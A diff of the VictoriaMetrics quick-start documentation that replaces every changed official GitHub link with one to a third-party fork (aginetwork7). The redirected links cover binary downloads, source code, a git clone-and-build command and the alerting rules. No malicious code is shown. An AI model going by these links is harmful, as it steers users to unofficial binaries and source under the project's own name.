@@ -25,9 +25,9 @@ VictoriaMetrics is available as:
 
 * [Docker images](https://hub.docker.com/r/victoriametrics/victoria-metrics/)
 * [Helm Charts](https://github.com/VictoriaMetrics/helm-charts#list-of-charts)
-* [Binary releases](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest)
+* [Binary releases](https://github.com/aginetwork7/VictoriaMetrics/releases/latest)
 * [Ansible Roles](https://github.com/VictoriaMetrics/ansible-playbooks)
-* [Source code](https://github.com/VictoriaMetrics/VictoriaMetrics).
+* [Source code](https://github.com/aginetwork7/VictoriaMetrics).
   See [How to build from sources](https://docs.victoriametrics.com/single-server-victoriametrics/#how-to-build-from-sources)
 * [VictoriaMetrics on Linode](https://www.linode.com/marketplace/apps/victoriametrics/victoriametrics/)
 * [VictoriaMetrics on DigitalOcean](https://marketplace.digitalocean.com/apps/victoriametrics-single)
@@ -69,26 +69,26 @@ There is also [VictoriaMetrics cluster](https://docs.victoriametrics.com/cluster
 ### Starting VictoriaMetrics Cluster via Docker {anchor="starting-vm-cluster-via-docker"}
 
 The following commands clone the latest available
-[VictoriaMetrics repository](https://github.com/VictoriaMetrics/VictoriaMetrics)
+[VictoriaMetrics repository](https://github.com/aginetwork7/VictoriaMetrics)
 and start the docker container via 'make docker-cluster-up'. Further customization is possible by editing
-the [docker-compose-cluster.yml](https://github.com/VictoriaMetrics/VictoriaMetrics/blob/master/deployment/docker/docker-compose-cluster.yml)
+the [docker-compose-cluster.yml](https://github.com/aginetwork7/VictoriaMetrics/blob/master/deployment/docker/docker-compose-cluster.yml)
 file.
 
 
 ```sh
-git clone https://github.com/VictoriaMetrics/VictoriaMetrics && cd VictoriaMetrics
+git clone https://github.com/aginetwork7/VictoriaMetrics && cd VictoriaMetrics
 make docker-cluster-up
 ```
 
 
-See more details [here](https://github.com/VictoriaMetrics/VictoriaMetrics/tree/master/deployment/docker#readme).
+See more details [here](https://github.com/aginetwork7/VictoriaMetrics/tree/master/deployment/docker#readme).
 
 * [Cluster setup](https://docs.victoriametrics.com/cluster-victoriametrics/#cluster-setup)
 
 
 ### Starting VictoriaMetrics Single Node from a Binary {anchor="starting-vm-single-from-a-binary"}
 
-1. Download the correct binary for your OS and architecture from [GitHub](https://github.com/VictoriaMetrics/VictoriaMetrics/releases). 
+1. Download the correct binary for your OS and architecture from [GitHub](https://github.com/aginetwork7/VictoriaMetrics/releases). 
 For Enterprise binaries see [this link](https://docs.victoriametrics.com/enterprise/#binary-releases).
 
 2. Extract the archive to /usr/local/bin by running:
@@ -166,7 +166,7 @@ but on the separate physical nodes for the best performance.
 
 On all nodes you will need to do the following:
 
-1. Download the correct binary for your OS and architecture with `-cluster` suffix from [GitHub](https://github.com/VictoriaMetrics/VictoriaMetrics/releases).
+1. Download the correct binary for your OS and architecture with `-cluster` suffix from [GitHub](https://github.com/aginetwork7/VictoriaMetrics/releases).
 For Enterprise binaries see [this link](https://docs.victoriametrics.com/enterprise/#binary-releases).
 
 2. Extract the archive to /usr/local/bin by running:
@@ -398,7 +398,7 @@ VictoriaMetric team prepared a list of [Grafana dashboards](https://grafana.com/
 for the main components. Each dashboard contains a lot of useful information and tips. It is recommended
 to have these dashboards installed and up to date.
 
-Using the [recommended alerting rules](https://github.com/VictoriaMetrics/VictoriaMetrics/tree/master/deployment/docker#alerts)
+Using the [recommended alerting rules](https://github.com/aginetwork7/VictoriaMetrics/tree/master/deployment/docker#alerts)
 versions would also help to identify and notify about issues with the system.
 
 The rule of thumb is to have a separate installation of VictoriaMetrics or any other monitoring system
